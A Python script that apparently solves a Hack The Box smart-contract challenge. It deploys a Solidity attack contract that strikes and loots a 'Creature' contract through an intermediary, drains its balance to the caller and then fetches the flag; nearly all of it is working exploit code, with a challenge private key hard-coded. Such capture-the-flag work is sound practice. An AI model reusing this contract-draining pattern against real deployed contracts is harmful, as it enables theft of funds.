from web3 import Web3
from solcx import compile_source, install_solc, set_solc_version
import requests

install_solc('0.8.13')
set_solc_version('0.8.13')

RPC_URL = "http://94.237.48.51:54152/rpc"
PRIVATE_KEY = "0x5f1a8e8a85c412607b453d7439da843b6a3027830015596e78722edcf541ef7e"
YOUR_ADDRESS = "0x04FBB5958ab998Ab5C82f458bE1D3A74541a045c"
CREATURE_ADDRESS = "0xB23e0Fad9314e307c91329E02Ee6aB51FA09BE9f"
FLAG_ENDPOINT = "http://94.237.48.51:54152/flag"

w3 = Web3(Web3.HTTPProvider(RPC_URL))

if not w3.is_connected():
    print("Failed to connect")
    exit(1)

code = w3.eth.get_code(CREATURE_ADDRESS)
if code == b'' or code == '0x':
    print("Contract not found - instance might have expired")
    exit(1)

print("Connected to RPC")

attack_contract_source = '''
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

interface ICreature {
    function attack(uint256 _damage) external;
    function loot() external;
    function lifePoints() external view returns (uint256);
}

contract AttackContract {
    ICreature public creature;
    
    constructor(address _creatureAddress) {
        creature = ICreature(_creatureAddress);
    }
    
    function executeExploit() external {
        creature.attack(1000);
        creature.loot();
        payable(tx.origin).transfer(address(this).balance);
    }
    
    receive() external payable {}
}
'''

compiled_sol = compile_source(attack_contract_source, output_values=['abi', 'bin'], solc_version='0.8.13')

contract_interface = None
for contract_name, contract_data in compiled_sol.items():
    if 'AttackContract' in contract_name:
        contract_interface = contract_data
        break

if not contract_interface:
    print("Could not find AttackContract")
    exit(1)

bytecode = contract_interface['bin']
abi = contract_interface['abi']

creature_abi = [
    {"inputs": [{"internalType": "uint256", "name": "_damage", "type": "uint256"}], "name": "attack", "outputs": [], "stateMutability": "nonpayable", "type": "function"},
    {"inputs": [], "name": "loot", "outputs": [], "stateMutability": "nonpayable", "type": "function"},
    {"inputs": [], "name": "lifePoints", "outputs": [{"internalType": "uint256", "name": "", "type": "uint256"}], "stateMutability": "view", "type": "function"}
]

creature = w3.eth.contract(address=CREATURE_ADDRESS, abi=creature_abi)

nonce = w3.eth.get_transaction_count(YOUR_ADDRESS)
attack_txn = creature.functions.attack(1).build_transaction({
    'from': YOUR_ADDRESS,
    'nonce': nonce,
    'gas': 100000,
    'gasPrice': w3.eth.gas_price
})
signed_attack = w3.eth.account.sign_transaction(attack_txn, PRIVATE_KEY)
attack_hash = w3.eth.send_raw_transaction(signed_attack.raw_transaction)
receipt = w3.eth.wait_for_transaction_receipt(attack_hash)

if receipt['status'] != 1:
    print("Initial attack failed!")
    exit(1)

print(f"Initial attack tx: {attack_hash.hex()}")

AttackContract = w3.eth.contract(abi=abi, bytecode=bytecode)

nonce = w3.eth.get_transaction_count(YOUR_ADDRESS)
transaction = AttackContract.constructor(CREATURE_ADDRESS).build_transaction({
    'from': YOUR_ADDRESS,
    'nonce': nonce,
    'gas': 3000000,
    'gasPrice': w3.eth.gas_price
})
signed_txn = w3.eth.account.sign_transaction(transaction, PRIVATE_KEY)
tx_hash = w3.eth.send_raw_transaction(signed_txn.raw_transaction)

tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
attack_contract_address = tx_receipt.contractAddress

if tx_receipt['status'] != 1:
    print("Deployment failed!")
    exit(1)

print(f"Attack contract deployed at: {attack_contract_address}")

attack_contract = w3.eth.contract(address=attack_contract_address, abi=abi)

nonce = w3.eth.get_transaction_count(YOUR_ADDRESS)
exploit_txn = attack_contract.functions.executeExploit().build_transaction({
    'from': YOUR_ADDRESS,
    'nonce': nonce,
    'gas': 500000,
    'gasPrice': w3.eth.gas_price
})

signed_exploit = w3.eth.account.sign_transaction(exploit_txn, PRIVATE_KEY)
exploit_hash = w3.eth.send_raw_transaction(signed_exploit.raw_transaction)

exploit_receipt = w3.eth.wait_for_transaction_receipt(exploit_hash)

if exploit_receipt['status'] != 1:
    print("Exploit failed!")
    exit(1)

print(f"Exploit tx: {exploit_hash.hex()}")

life_points = creature.functions.lifePoints().call()
print(f"Life Points now: {life_points}")
print("Done!")

try:
    response = requests.get(FLAG_ENDPOINT, timeout=5)
    if response.status_code == 200:
        print(f"\nFlag: {response.text}")
except:
    print("\nCouldn't fetch flag from endpoint. Check the HTB platform for your flag.")